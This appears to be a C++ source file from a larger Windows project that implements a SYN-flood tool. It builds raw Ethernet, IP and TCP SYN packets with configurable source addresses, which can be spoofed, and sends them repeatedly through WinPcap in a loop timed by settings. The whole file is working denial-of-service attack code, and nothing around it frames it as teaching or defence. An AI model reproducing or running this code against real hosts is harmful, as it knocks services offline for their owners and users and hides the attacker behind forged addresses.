#include "SynFlood.h"

#ifdef MFC
	#define LOG_DEBUG printf
	#define LOG_ERROR printf
	#define LOG_INFO printf
#else
	#define LOG_DEBUG printf
	#define LOG_ERROR printf
	#define LOG_INFO TRACE
#endif

struct PSD_HEADER
{
	unsigned long saddr;
	unsigned long daddr;
	char mbz;
	char ptcl;
	unsigned short tcpl;
}; 

/*计算校验和*/
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1) {
		cksum+=*buffer++;
		size-=sizeof(USHORT);
	}
	if(size) cksum+=*(UCHAR*)buffer;
	cksum=(cksum >> 16)+(cksum&0xffff);
	cksum+=(cksum >>16);
	return (USHORT)(~cksum); 
}


CSynFlood::CSynFlood(void)
{
	m_bExit = FALSE;
	m_Para = NULL;
}

CSynFlood::~CSynFlood(void)
{
}

int CSynFlood::ConstructTcpHead(TCP_HEADER *pHead, const char* srcIp, USHORT srcPort, const char* desIp, USHORT desPort)
{
	int nRet = 0;
	unsigned int nSEQ = CBase::Rand(0, 32767);    
	USHORT nWin = CBase::Rand(100, 32767); 
	char buffer[100];
	
	pHead->th_dport=htons(desPort);
	pHead->th_sport = htons(srcPort);
	pHead->th_seq = htonl(nSEQ);
	pHead->th_ack = 0;
	pHead->th_lenres =(sizeof(TCP_HEADER) / 4 << 4 | 0);
	pHead->th_flag = 2;
	pHead->th_win = htons(nWin);
	pHead->th_urp = 0;
	pHead->th_sum = 0;

	//计算tcp校验和
	PSD_HEADER psdHeader;
	psdHeader.saddr = inet_addr(srcIp);
	psdHeader.daddr = inet_addr(desIp);
	psdHeader.mbz = 0; 
	psdHeader.ptcl = IPPROTO_TCP;
	psdHeader.tcpl = htons(sizeof(TCP_HEADER));
	memcpy(buffer, &psdHeader, sizeof(PSD_HEADER));
	memcpy(buffer + sizeof(PSD_HEADER), pHead, sizeof(TCP_HEADER));
	pHead->th_sum = checksum((USHORT *)buffer, sizeof(PSD_HEADER) + sizeof(TCP_HEADER));

	return nRet;
}

int CSynFlood::ConstructIpHead(IP_HEADER *pHead, const char* srcIp, const char* desIp)
{
	int nRet = 0;
	unsigned short nId = CBase::Rand(1, 32767);
	pHead->h_verlen=( 4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
	pHead->tos = 0;
	pHead->total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
	pHead->ident = ntohs(nId);
	pHead->frag_and_flags = 0;
	pHead->ttl = 128;
	pHead->proto = IPPROTO_TCP;
	pHead->checksum =0;
	pHead->sourceIP = inet_addr(srcIp);
	pHead->destIP = inet_addr(desIp);
	
	//计算ip校验和
	pHead->checksum = checksum((USHORT *)pHead, sizeof(IP_HEADER));

	return nRet;
}

int CSynFlood::ConstructMacHead(ETHERNET_HEAD *pHead, const char *pSrcMac, const char *pDstMac)
{
	int nRet = 0;
	unsigned char srcMac[MAC_LENGTH], dstMac[MAC_LENGTH];
	HexStringToCharArrary((char*)pSrcMac, srcMac);
	HexStringToCharArrary((char*)pDstMac, dstMac);
	memcpy(pHead->dest_mac, dstMac, MAC_LENGTH);
	memcpy(pHead->source_mac, srcMac, MAC_LENGTH);
	pHead->eh_type = htons(ETH_IP);

	return nRet;
}

int CSynFlood::Construct(char *pBuffer, const char* srcMac, const char* srcIp, USHORT srcPort, 
						 const char* dstMac, const char* desIp, USHORT desPort)
{
	int nRet = 0;
	IP_HEADER ipHead;
	TCP_HEADER tcpHead;
	ETHERNET_HEAD macHead;
	
	ConstructTcpHead(&tcpHead, srcIp, srcPort, desIp, desPort);
	ConstructIpHead(&ipHead, srcIp, desIp);
	ConstructMacHead(&macHead, srcMac, dstMac);
	
	memcpy(pBuffer, &macHead, sizeof(ETHERNET_HEAD));
	memcpy(pBuffer + sizeof(ETHERNET_HEAD), &ipHead, sizeof(IP_HEADER));
	memcpy(pBuffer + sizeof(ETHERNET_HEAD) + sizeof(IP_HEADER), &tcpHead, sizeof(TCP_HEADER));

	return nRet;
}

int CSynFlood::Construct(char *pBuffer)
{
	int nRet = 0;
	std::string srcIp, srcMac;
	USHORT nPort = 0;
	
	if(NULL == m_Para)
		return -1;
	m_Para->GetSrc(srcIp, srcMac, nPort);
	nRet = Construct(
				pBuffer, 
				srcMac.c_str(),
				srcIp.c_str(),
				nPort,
				m_Para->GetDstMac().c_str(), 
				m_Para->GetDstIp().c_str(),
				m_Para->GetDstPort()
				);

	return nRet;
}

int CSynFlood::svc()
{
	int nRet = 0;
	struct arp_packet packet;
	pcap_t * pHandler;
	char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
	std::string szInterfaceName;
	int nNum = 0;

	if(NULL == m_Para)
		return -1;

	szInterfaceName = m_Para->GetInterfaceName();
	/* 打开网卡 */ 
	if((pHandler = pcap_open(szInterfaceName.c_str(), // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
		) ) == NULL) 
	{ 
		LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
			szInterfaceName.c_str()); 
		/* Free the device list */ 
		return -1; 
	} 

	int nLen = sizeof(ETHERNET_HEAD) + sizeof(IP_HEADER) + sizeof(TCP_HEADER);
	char *pBuffer = new char[nLen];
	if(NULL == pBuffer)
	{
		printf("don't new buffer\n");
		return -1;
	}

	DWORD tStart = GetTickCount();
	int nSleep = 500, nRun = 1000;
	nSleep = CBase::GetConfigInt("section", "sleep_time", nSleep);
	nRun =  CBase::GetConfigInt("section", "run_time", nRun);
	//发送欺骗包
	while(!m_bExit)
	{
#ifndef _EXE_
		nRet = m_Para->TimePolic();
		if(1 == nRet)
		{
			break; 
		}
		else if(2 == nRet)
		{
			Sleep(2 * 1000);
			nNum = 0;
			continue;
		}// 结束 if(2 == nRet)
		
		if(nNum < 1)
		{
			m_Para->Update();
			nNum ++;
		}

		DWORD t = GetTickCount();
		if(t - tStart > nRun)
		{
			Sleep(nSleep);
			tStart = GetTickCount();
		}
		else if(tStart > t) //溢出处理
			tStart = t;
#endif
		Construct(pBuffer);
		int n = CBase::GetConfigInt("section", "send_number", 1);
		while(n--)
		{
			if(pcap_sendpacket(pHandler, (const u_char * )pBuffer, nLen) == -1)
			{
				LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
			}
		}
	}

	pcap_close(pHandler);
	if(pBuffer) delete []pBuffer;

	return nRet;
}
